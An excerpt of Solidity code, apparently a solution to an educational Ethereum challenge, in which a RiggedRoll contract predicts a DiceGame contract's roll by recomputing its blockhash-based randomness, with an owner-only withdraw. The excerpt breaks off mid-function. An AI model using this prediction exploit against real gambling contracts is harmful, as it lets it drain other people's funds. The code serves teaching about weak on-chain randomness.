...
contract DiceGame {
    ...
    function resetPrize() private {
        prize = ((address(this).balance * 10) / 100); // 10% of pool
    }
...
contract RiggedRoll is Ownable {
    ...
    function withdraw() public onlyOwner {
        require(address(this).balance > 0.03 ether, "Fund too small");
        (bool sent, ) = msg.sender.call{value: address(this).balance - 0.03 ether}("");
    ...
    function riggedRoll() public onlyOwner {
        require(address(this).balance > 0.002 ether, "Not enough fund");
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint predictedRoll = uint256(hash) % 16;
